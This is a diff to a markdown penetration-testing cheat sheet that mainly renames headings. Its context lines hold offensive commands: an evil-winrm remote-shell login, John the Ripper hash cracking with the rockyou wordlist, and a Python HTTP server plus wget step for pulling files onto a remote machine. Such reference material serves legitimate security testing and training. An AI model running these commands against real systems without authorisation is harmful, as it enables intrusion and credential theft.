@@ -234,19 +234,6 @@ evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
 
 <br />
 
-**OVERVIEW**
- 
-|   |  	 | 
-| :-----------: | :-----------: |
-| Description | 	  Password/hash cracking tool | 
-| Download | Pre-installed on Kali Linux  |   
-
-<br />
-
-**USAGE**
-
-<br />
-
 ```bash
 # About: A tool used to crack passwords and hashes 
 # Download: Pre-installed on Kali Linux
@@ -262,7 +249,7 @@ john -w=/usr/share/wordlists/rockyou.txt {FILE.txt}
 
 ***
 
-## Host Python Server [STEP 1]
+## Python Server [STEP 1]
 
 <br />
 
@@ -270,14 +257,14 @@ john -w=/usr/share/wordlists/rockyou.txt {FILE.txt}
 # About: A python command used to open a server on the client machine
 # Download: Pre-installed on Kali Linux
 
-# USAGE
+# USAGE - Host on client machine
 sudo python3 -m http.server {PORT}
 
 # {PORT}: Port to open for file transfer
 ```
 <br />
 
-## Download File with WGET [STEP 2] 
+## WGET [STEP 2] 
 
 <br />
 
@@ -285,7 +272,7 @@ sudo python3 -m http.server {PORT}
 # About: A command used to download files on the current machine
 # Download: Pre-installed on Kali Linux
 
-# Download files on the remote machine
+# Usage - Download on server machine
 wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
 
 # {IP ADDRESS}: Python Server IP Address from step one
